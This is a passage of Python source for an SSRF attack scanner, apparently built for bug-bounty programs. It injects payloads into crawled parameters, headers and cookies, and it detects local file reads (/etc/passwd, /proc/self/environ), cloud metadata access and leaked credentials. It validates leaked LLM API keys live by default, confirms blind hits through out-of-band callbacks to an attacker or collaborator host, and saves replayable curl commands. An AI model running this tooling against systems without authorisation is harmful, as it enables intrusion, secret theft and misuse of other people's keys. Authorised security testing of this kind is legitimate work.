                    "id": "raw", "name": "raw", "category": "unknown",
                    "payload": p, "tags": [], "description": "",
                    "_token": token, "_oob_url": oob_url,
                })
                continue

            provider = (entry.get("provider") or "").lower()
            if self.provider_filter and provider and provider != self.provider_filter:
                continue

            entry = dict(entry)
            token = random_token()
            oob_url = build_oob_url(self.collab_host, token, path_hint=entry["id"])
            oob_host = urlparse(oob_url).netloc
            canary_url = f"https://{self.canary_host}/huginn-{token}/{entry['id']}"

            entry["payload"] = _substitute_all(
                entry["payload"], self.attacker_domain, ctx_target,
                self.collab_host, self.canary_host,
                oob_url, oob_host, canary_url, token,
            )
            entry["_token"] = token
            entry["_oob_url"] = oob_url
            entry["_canary_url"] = canary_url
            self._tokens_by_id[entry["id"]] = token
            with self._oob_lock:
                self._oob_tokens_issued.add(token)
            out.append(entry)

        self._payloads = out
        return out

    # ------------------------------------------------------------------ #
    def capture_baseline(self, ip):
        # Single canonical baseline
        start = time.time()
        try:
            ip.baseline_resp = build_request(
                ip, ip.value, timeout=self.timeout,
                static_headers=self.static_headers)
        except Exception:
            ip.baseline_resp = None
        ip.baseline_elapsed = time.time() - start

        if ip.baseline_resp is not None:
            waf = _detect_waf_challenge(ip.baseline_resp)
            if waf:
                ip.skipped_reason = f"waf:{waf}"
                return ip.baseline_resp

        # 3-sample statistical baseline (length + timing)
        lengths, timings = [], []
        for i in range(3):
            benign = ip.value if i == 0 else f"{ip.value or ''}b{i}"
            t0 = time.time()
            try:
                r = build_request(ip, benign, timeout=self.timeout,
                                  static_headers=self.static_headers)
            except Exception:
                r = None
            timings.append(time.time() - t0)
            if r is not None:
                lengths.append(len(r.text or ""))

        if lengths:
            ip.baseline_len_mean = sum(lengths) / len(lengths)
            ip.baseline_len_stddev = (
                (sum((x - ip.baseline_len_mean) ** 2 for x in lengths) / (len(lengths) - 1)) ** 0.5
                if len(lengths) > 1 else 0.0
            )
        if timings:
            ip.timing_median = sorted(timings)[len(timings) // 2]
            ip.timing_stddev = (
                (sum((x - ip.timing_median) ** 2 for x in timings) / (len(timings) - 1)) ** 0.5
                if len(timings) > 1 else 0.0
            )

        # Path-segment SPA pre-flight
        if ip.is_path_segment:
            probe = "hgnn" + random_token(6)
            try:
                r = build_request(ip, probe, timeout=self.timeout,
                                  static_headers=self.static_headers)
            except Exception:
                r = None
            if r is not None and ip.baseline_resp is not None:
                if (r.text or "") == (ip.baseline_resp.text or ""):
                    ip.skipped_reason = "spa_route"

        return ip.baseline_resp

    # ------------------------------------------------------------------ #
    def _classify(self, ip, payload_obj, resp, elapsed):
        if resp is None:
            return None
        if ip.skipped_reason:
            return None

        body = resp.text or ""
        detection_field = payload_obj.get("detection", "")
        category = payload_obj.get("category", "")
        protocol = payload_obj.get("protocol", "")

        # 1. Local file read
        if protocol == "file":
            if re.search(r"root:[x*]?:0:0", body) or "[extensions]" in body:
                return {
                    "severity": "high",
                    "reason": "Local file read confirmed (/etc/passwd or win.ini)",
                    "evidence": body[:200],
                    "subtype": "local_file_read",
                    "verification_method": "file_read",
                }
            if any(s in body for s in ("AWS_ACCESS_KEY", "DATABASE_URL", "SECRET_KEY")):
                return {
                    "severity": "critical",
                    "reason": "Secrets in /proc/self/environ response",
                    "evidence": body[:200],
                    "subtype": "env_secret_leak",
                    "verification_method": "env_read",
                }

        # 2. Credential leak (with optional key validation)
        cred = _is_credential_leak(body)
        if cred:
            llm_keys = None
            if self.validate_keys:
                # Cache by body hash so repeated payloads on same leak don't revalidate
                bh = hashlib.sha256(body.encode("utf-8", errors="ignore")).hexdigest()[:16]
                llm_keys = validate_llm_keys(
                    body, timeout=self.key_validation_timeout,
                    cache_key=bh,
                )
            hit = {
                "severity": "critical",
                "reason": f"Credential-shaped string in response: '{cred}'",
                "evidence": cred,
                "subtype": "cloud_credential_leak",
                "verification_method": "credential_marker",
            }
            if llm_keys:
                hit["llm_keys"] = llm_keys
                live = [k for k in llm_keys if k.get("valid") is True]
                if live:
                    hit["severity"] = "confirmed"
                    hit["reason"] = (
                        f"Live LLM API key(s) leaked: "
                        f"{', '.join(k['provider'] for k in live)}"
                    )
            return hit

        # 3. Metadata reachability
        meta = _is_metadata_body(body)
        if meta and category in ("cloud_metadata", "modern",
                                 "internal_rfc1918", "waf_bypass"):
            return {
                "severity": "critical",
                "reason": f"Cloud metadata marker in response: '{meta}'",
                "evidence": meta,
                "subtype": "cloud_metadata",
                "verification_method": "metadata_marker",
            }

        # 4. Explicit detection string
        matched = _contains_detection_string(body, detection_field)
        if matched:
            return {
                "severity": "high",
                "reason": f"Payload-specific detection string matched: '{matched}'",
                "evidence": matched,
                "subtype": self._subtype(payload_obj),
                "verification_method": "detection_string",
            }

        # 5. Internal-service marker
        internal = _match_any(body, INTERNAL_MARKERS)
        if internal:
            if category in ("internal_service", "protocol_abuse", "cloud_metadata"):
                sev = "high"
            else:
                sev = "medium"
            return {
                "severity": sev,
                "reason": f"Internal-service marker in response: '{internal}'",
                "evidence": internal,
                "subtype": self._subtype(payload_obj),
                "verification_method": "internal_marker",
            }

        # 6. Timing anomaly (statistical)
        if ip.timing_median is not None and elapsed is not None:
            sigma = ip.timing_stddev or 0.0
            required = max(TIME_DELAY_THRESHOLD, 3.0 * sigma + 2.0)
            delta = elapsed - ip.timing_median
            if delta >= required:
                return {
                    "severity": "medium",
                    "reason": (f"Timing anomaly: median {ip.timing_median:.2f}s vs "
                               f"probe {elapsed:.2f}s (+{delta:.2f}s)"),
                    "evidence": f"+{delta:.2f}s",
                    "subtype": "timing_blind",
                    "verification_method": "timing",
                }

        # 7. Directional length delta with anchored IP-marker check
        if (ip.baseline_len_mean is not None and resp.status_code == 200):
            probe_len = len(body)
            delta = probe_len - ip.baseline_len_mean
            sigma = ip.baseline_len_stddev or 0.0
            required = max(LENGTH_DELTA_THRESHOLD, 3.0 * sigma)
            if delta >= required:
                if _IP_MARKER_RE.search(payload_obj["payload"]):
                    return {
                        "severity": "medium",
                        "reason": (f"Response length delta: "
                                   f"{ip.baseline_len_mean:.0f} → {probe_len}"),
                        "evidence": f"delta=+{delta:.0f}",
                        "subtype": "blind_length_delta",
                        "verification_method": "length_delta",
                    }

        return None

    @staticmethod
    def _subtype(payload_obj):
        cat = payload_obj.get("category", "")
        mapping = {
            "cloud_metadata":     "cloud_metadata",
            "internal_service":   f"internal_{payload_obj.get('service', 'service')}",
            "blind_oob":          "blind_oob",
            "modern":             "modern_bypass",
            "whitelist_bypass":   "whitelist_bypass",
            "waf_bypass":         "waf_bypass",
            "internal_rfc1918":   "internal_rfc1918",
            "basic_loopback":     "loopback",
            "ip_encoding":        "ip_encoding",
            "dns_rebinding":      "dns_rebinding",
        }
        if cat == "protocol_abuse":
            return f"protocol_{payload_obj.get('protocol', 'unknown')}"
        return mapping.get(cat, "generic_ssrf")

    # ------------------------------------------------------------------ #
    def test_payload(self, ip, payload_obj):
        if ip.skipped_reason:
            return None

        category = payload_obj.get("category", "")
        payload = payload_obj["payload"]

        # ---- Route special categories -----------------------------------
        if category == ROUTE_HEADER_CATEGORY:
            parsed = _parse_header_payload(payload)
            if not parsed:
                return None
            hdrs = dict(self.static_headers)   # static headers FIRST
            hdrs.update(parsed)                # then injected headers win
            for k, v in (payload_obj.get("headers") or {}).items():
                hdrs[k] = v
            method = payload_obj.get("method", "GET").upper()
            start = time.time()
            try:
                resp = send_request(ip.url, method=method, headers=hdrs,
                                    timeout=self.timeout, allow_redirects=False)
            except Exception:
                return None
            elapsed = time.time() - start
            hit = self._classify(ip, payload_obj, resp, elapsed)
            if not hit:
                return None
            return self._build_finding(ip, payload_obj, hit, resp, elapsed,
                                       extra={"injected_headers": parsed})

        if category == ROUTE_COOKIE_CATEGORY:
            parsed = _parse_cookie_payload(payload)
            if not parsed:
                return None
            injected = "; ".join(f"{k}={v}" for k, v in parsed.items())
            hdrs = dict(self.static_headers)
            existing = hdrs.get("Cookie", "")
            hdrs["Cookie"] = f"{existing}; {injected}".strip("; ") if existing else injected
            start = time.time()
            try:
                resp = send_request(ip.url, method="GET", headers=hdrs,
                                    timeout=self.timeout, allow_redirects=False)
            except Exception:
                return None
            elapsed = time.time() - start
            hit = self._classify(ip, payload_obj, resp, elapsed)
            if not hit:
                return None
            return self._build_finding(ip, payload_obj, hit, resp, elapsed,
                                       extra={"injected_cookies": parsed})

        if category == ROUTE_HPP_CATEGORY:
            p = urlparse(ip.url)
            base = urlunparse(p._replace(query=""))
            target_url = base + (payload if payload.startswith("?") else "?" + payload)
            start = time.time()
            try:
                resp = send_request(target_url, method="GET",
                                    headers=dict(self.static_headers),
                                    timeout=self.timeout, allow_redirects=False)
            except Exception:
                return None
            elapsed = time.time() - start
            hit = self._classify(ip, payload_obj, resp, elapsed)
            if not hit:
                return None
            return self._build_finding(ip, payload_obj, hit, resp, elapsed,
                                       extra={"hpp_url": target_url})

        # ---- Standard transport -----------------------------------------
        start = time.time()
        try:
            resp = build_request(ip, payload, payload_meta=payload_obj,
                                 timeout=self.timeout,
                                 static_headers=self.static_headers)
        except Exception:
            return None
        elapsed = time.time() - start

        if resp is not None:
            waf = _detect_waf_challenge(resp)
            if waf:
                return None

        hit = self._classify(ip, payload_obj, resp, elapsed)

        # ---- OOB fallback -----------------------------------------------
        token = payload_obj.get("_token")
        oob_confirmed = False
        if self.oob_poller and token:
            if not hit:
                time.sleep(0.4)
            if self.oob_poller.has_token(token):
                oob_confirmed = True
                if not hit:
                    hit = {
                        "severity": "confirmed",
                        "reason": "Out-of-band callback received on OOB receiver",
                        "evidence": payload_obj.get("_oob_url", ""),
                        "subtype": "blind_oob_confirmed",
                        "verification_method": "oob_token",
                    }
                elif hit.get("severity") != "confirmed":
                    hit["severity"] = "confirmed"
                    hit["verification_method"] = "oob_token"

        if not hit:
            return None
        return self._build_finding(ip, payload_obj, hit, resp, elapsed,
                                   oob_confirmed=oob_confirmed)

    # ------------------------------------------------------------------ #
    def _build_finding(self, ip, payload_obj, hit, resp, elapsed,
                       extra=None, oob_confirmed=False):
        severity = hit["severity"]
        body = resp.text if resp is not None else ""
        needle = (payload_obj.get("detection") or
                  (payload_obj.get("_token") and
                   f"huginn-{payload_obj['_token']}") or "")

        finding = {
            "type": "ssrf",
            "subtype": hit.get("subtype", "generic_ssrf"),
            "severity": severity,
            "confirmed": severity == "confirmed",
            "verification_method": hit.get("verification_method"),

            "url": ip.url,
            "method": ip.method,
            "parameter": ip.name,
            "injection_point": {
                "location": ip.location,
                "name": ip.name,
                "original_value": (ip.value or "")[:200],
                "json_path": ip.json_path,
            },

            "payload_id":          payload_obj.get("id"),
            "payload_name":        payload_obj.get("name"),
            "payload":             payload_obj["payload"],
            "payload_category":    payload_obj.get("category"),
            "payload_provider":    payload_obj.get("provider"),
            "payload_protocol":    payload_obj.get("protocol"),
            "payload_service":     payload_obj.get("service"),
            "payload_tags":        payload_obj.get("tags", []),
            "payload_description": payload_obj.get("description", ""),
            "payload_references":  payload_obj.get("references", []),
            "payload_severity_hint": payload_obj.get("severity_hint"),

            "detection_reason": hit["reason"],
            "evidence":         hit.get("evidence", ""),

            "llm_keys": hit.get("llm_keys"),

            "response_status":   resp.status_code if resp is not None else None,
            "response_length":   len(body) if body is not None else None,
            "response_snippet":  _response_snippet(body, needle),

            "baseline_status":   (ip.baseline_resp.status_code
                                  if ip.baseline_resp else None),
            "baseline_length":   (len(ip.baseline_resp.text or "")
                                  if ip.baseline_resp else None),
            "baseline_len_mean": (round(ip.baseline_len_mean, 1)
                                  if ip.baseline_len_mean is not None else None),
            "baseline_len_sigma":(round(ip.baseline_len_stddev, 1)
                                  if ip.baseline_len_stddev is not None else None),
            "baseline_timing":   round(ip.timing_median or ip.baseline_elapsed or 0, 3),
            "timing_stddev":     round(ip.timing_stddev or 0, 3),
            "elapsed_seconds":   round(elapsed, 3),

            "curl_command": build_curl(ip, payload_obj["payload"],
                                       payload_obj,
                                       static_headers=self.static_headers),

            "attacker_domain": self.attacker_domain,
            "collab_host":     self.collab_host,
            "canary_host":     self.canary_host,
            "oob_url":         payload_obj.get("_oob_url"),
            "oob_token":       payload_obj.get("_token"),
            "oob_confirmed":   oob_confirmed,
            "target_domain":   self.target_domain,
            "program_headers_used": bool(self.static_headers),

            "timestamp": time.strftime("%Y-%m-%dT%H:%M:%SZ", time.gmtime()),
            "remediation": (
                "Enforce a strict allow-list of permitted destinations. "
                "Resolve and validate the destination host before making the "
                "request (block RFC1918, link-local, loopback, IPv6 transition "
                "addresses, and cloud metadata IPs). Do not trust "
                "X-Forwarded-Host or Referer. Use a dedicated egress proxy "
                "that enforces the allow-list. On cloud, require IMDSv2 (AWS) "
                "and disable unused metadata services. Forbid non-http(s) "
                "schemes (gopher, dict, file, ldap, smb). Rotate any leaked "
                "credentials immediately."
            ),
        }
        if extra:
            finding["injection_extra"] = extra

        sig = hashlib.md5(
            f"{ip.url}|{ip.name}|{payload_obj.get('id')}|{severity}".encode()
        ).hexdigest()
        if sig in self.seen_signatures:
            return None
        self.seen_signatures.add(sig)

        host = urlparse(ip.url).netloc
        slug = safe_filename(
            (urlparse(ip.url).path or "/").replace("/", "_") or "_root"
        )
        fname = (f"{slug}__{safe_filename(ip.name)}__"
                 f"{payload_obj.get('id','x')}_ssrf_vulnerable.json")
        out_path = self.findings_root / safe_filename(host) / fname
        save_json(out_path, finding)

        sev_color = {
            "confirmed": "\033[38;5;46m",
            "critical":  "\033[38;5;196m",
            "high":      "\033[38;5;208m",
            "medium":    "\033[38;5;226m",
            "low":       "\033[38;5;240m",
        }.get(severity, "\033[0m")

        log(
            f"[{sev_color}{severity.upper():9}\033[0m] "
            f"{ip.location}:{ip.name} @ {ip.url} "
            f"({payload_obj.get('name')} → {hit.get('subtype')})",
            "hit", "SSRF",
        )
        return finding

    # ------------------------------------------------------------------ #
    def test_point(self, ip, payloads):
        self.capture_baseline(ip)
        if ip.skipped_reason:
            return []
        findings = []
        for p in payloads:
            f = self.test_payload(ip, p)
            if f:
                findings.append(f)
            time.sleep(self.delay)
        return findings

    # ------------------------------------------------------------------ #
    def run(self):
        section("SSRF SCANNER :: INITIALISING")
        log(f"attacker   : {self.attacker_domain}")
        log(f"collab     : {self.collab_host}")
        log(f"oob check  : {self.oob_check_url}")
        if self.provider_filter:
            log(f"provider   : {self.provider_filter}")

        if self.headers_path:
            log(f"headers    : loaded {len(self.static_headers)} header(s) "
                f"from {self.headers_path}", "ok")
            for h in self.static_headers:
                log(f"  · {h}", "info")
        else:
            log("headers    : no program headers file found "
                "(expected at <program_dir>/headers/default.txt)", "warn")

        log(f"llm key validation : "
            f"{'ENABLED' if self.validate_keys else 'disabled'}",
            "info")

        payloads = self.load_and_filter_payloads()
        log(f"loaded {len(payloads)} payloads", "info")

        if self.oob_poller and self.oob_poller.start():
            log("OOB poller started", "ok")
        elif self.oob_poller:
            log("OOB poller unavailable — blind confirmation disabled", "warn")

        pages = []
        for jf in self.sites_root.rglob("*.json"):
            if jf.name.startswith("_"):
                continue
            try:
                rec = load_json(jf)
                if rec.get("url") and not _is_static_url(rec["url"]):
                    pages.append(rec)
            except Exception:
                continue
        log(f"loaded {len(pages)} crawled pages", "info")

        points = extract_injection_points(pages)
        log(f"extracted {len(points)} injection points", "ok")

        if not points:
            log("nothing to test", "warn")
            if self.oob_poller:
                self.oob_poller.stop()
            return []

        section("SSRF SCANNER :: STRIKE PHASE")
        all_findings = []
        done, total = 0, len(points)

        with ThreadPoolExecutor(max_workers=self.max_workers) as pool:
            futures = {pool.submit(self.test_point, ip, payloads): ip
                       for ip in points}
            for fut in as_completed(futures):
                done += 1
                ip = futures[fut]
                try:
                    all_findings.extend(fut.result())
                except Exception as e:
                    log(f"error testing {ip}: {e}", "warn")
                if done % 20 == 0 or done == total:
                    log(f"progress {done}/{total}  hits={len(all_findings)}",
                        "info")

        # Drain OOB callbacks only if we actually sent tokens
        if self.oob_poller and self.oob_poller.any_tokens():
            log("waiting for OOB callbacks…", "info")
            time.sleep(min(10, getattr(self.oob_poller, "timeout", 10)))
        if self.oob_poller:
            self.oob_poller.stop()

        # Late-arrival upgrade pass
        for f in all_findings:
            tok = f.get("oob_token")
            if (tok and not f.get("confirmed") and self.oob_poller
                    and self.oob_poller.has_token(tok)):
                f["confirmed"] = True
                if f["severity"] != "confirmed":
                    f["severity"] = "confirmed"
                f["verification_method"] = "oob_token_post_scan"

        section("SSRF SCANNER :: COMPLETE")
        confirmed = [f for f in all_findings if f.get("confirmed")]
        if all_findings:
            by_sev = {}
            for f in all_findings:
                by_sev[f["severity"]] = by_sev.get(f["severity"], 0) + 1
            for s in ("confirmed", "critical", "high", "medium", "low"):
                if s in by_sev:
                    log(f"{s:10} : {by_sev[s]}", "ok")
            log(f"CONFIRMED    : {len(confirmed)}", "ok", "DONE")
            log(f"total        : {len(all_findings)}", "info")
        else:
            log("no SSRF findings", "info", "DONE")

        save_json(self.findings_root / "_summary.json", {
            "total": len(all_findings),
            "confirmed": len(confirmed),
            "by_severity": {s: sum(1 for f in all_findings if f["severity"] == s)
                            for s in ("confirmed", "critical", "high",
                                      "medium", "low")},
            "by_subtype":      self._summarize(all_findings, "subtype"),
            "by_category":     self._summarize(all_findings, "payload_category"),
            "by_verification": self._summarize(all_findings, "verification_method"),
            "attacker_domain": self.attacker_domain,
            "collab_host":     self.collab_host,
            "provider_filter": self.provider_filter,
            "program_headers_used": sorted(self.static_headers.keys()),
            "llm_key_validation_enabled": self.validate_keys,
            "oob_tokens_observed": sorted(self.oob_poller.all_tokens())
                                   if self.oob_poller else [],
            "timestamp": time.strftime("%Y-%m-%dT%H:%M:%SZ", time.gmtime()),
            "findings": [
                {"url": f["url"], "param": f["parameter"],
                 "severity": f["severity"], "subtype": f["subtype"],
                 "confirmed": f.get("confirmed", False),
                 "verification": f.get("verification_method"),
                 "payload_name": f["payload_name"]}
                for f in all_findings
            ],
            "confirmed_findings": [
                {"url": f["url"], "param": f["parameter"],
                 "severity": f["severity"], "subtype": f["subtype"],
                 "curl": f["curl_command"],
                 "llm_keys": f.get("llm_keys")}
                for f in confirmed
            ],
        })

        if confirmed:
            save_json(self.findings_root / "_confirmed.json", {
                "count": len(confirmed),
                "timestamp": time.strftime("%Y-%m-%dT%H:%M:%SZ", time.gmtime()),
                "findings": confirmed,
            })

        return all_findings

    @staticmethod
    def _summarize(findings, key):
        out = {}
        for f in findings:
            k = f.get(key) or "unknown"
            out[k] = out.get(k, 0) + 1
        return out


# =============================================================================
#  ENTRY
# =============================================================================
def run(program_dir, sites_root=None,
        attacker_domain=DEFAULT_ATTACKER,
        collab_host=DEFAULT_COLLAB,
        canary_host=DEFAULT_CANARY,
        oob_check_url=DEFAULT_OOB_CHECK,
        target_domain=None,
        provider_filter=None,
        oob_log_file=None,
        headers_file=None,
        validate_keys=True):
    scanner = SSRFScanner(
        program_dir=program_dir,
        sites_root=sites_root,
        attacker_domain=attacker_domain,
        collab_host=collab_host,
        canary_host=canary_host,
        oob_check_url=oob_check_url,
        target_domain=target_domain,
        provider_filter=provider_filter,
        oob_log_file=oob_log_file,
        headers_file=headers_file,
        validate_keys=validate_keys,
    )
    return scanner.run()


if __name__ == "__main__":
    import argparse
    ap = argparse.ArgumentParser(description="HUGINN SSRF scanner v4.0")
    ap.add_argument("program_dir")
    ap.add_argument("--attacker", default=DEFAULT_ATTACKER)
    ap.add_argument("--collab",   default=DEFAULT_COLLAB)
    ap.add_argument("--canary",   default=DEFAULT_CANARY)
    ap.add_argument("--oob-check", default=DEFAULT_OOB_CHECK)
    ap.add_argument("--target",   default=None)
    ap.add_argument("--provider", default=None,
                    choices=[None, "aws", "gcp", "azure", "digitalocean",
                             "alibaba", "oracle", "kubernetes", "tencent",
                             "huawei"])
    ap.add_argument("--oob-log", default=None,
                    help="local log file (interactsh-client); overrides --oob-check")
    ap.add_argument("--headers-file", default=None,
                    help="explicit path to a headers file "
                         "(default: <program_dir>/headers/default.txt)")
    ap.add_argument("--no-validate-keys", action="store_true",
                    help="disable LLM API key validation (some programs "
                         "consider third-party validation out-of-scope)")
    args = ap.parse_args()
    run(args.program_dir,
        attacker_domain=args.attacker,
        collab_host=args.collab,
        canary_host=args.canary,
        oob_check_url=args.oob_check,
        target_domain=args.target,
        provider_filter=args.provider,
        oob_log_file=args.oob_log,
        headers_file=args.headers_file,
        validate_keys=not args.no_validate_keys)
